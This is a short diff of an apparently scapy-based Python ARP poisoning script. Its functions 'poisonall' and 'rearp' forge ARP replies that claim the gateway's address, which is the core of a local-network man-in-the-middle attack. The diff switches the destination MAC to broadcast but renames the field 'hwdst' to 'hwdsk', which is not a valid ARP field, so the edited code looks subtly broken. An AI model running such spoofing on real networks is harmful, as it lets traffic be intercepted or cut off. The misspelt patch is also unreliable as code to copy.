@@ -44,7 +44,7 @@ def poisonall(gateway):
 	   packet = ARP()
 	   packet.op = 2
 	   packet.psrc = gateway
-	   packet.hwdst = '00:00:00:00:00:00'
+	   packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
 	   temp2 = gateway.rpartition(".")
 	   random = temp2[0]
 	   random = random + ".37"
@@ -70,7 +70,7 @@ def rearp(gateway):
 		macaddr = mac.rstrip("\n")
 		packet.hwsrc = macaddr
 		packet.psrc = gateway
-		packet.hwdst = '00:00:00:00:00:00'
+		packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
 		temp2 = gateway.rpartition(".")
 		random = temp2[0]
 		random = random + ".37" #random ip  - required
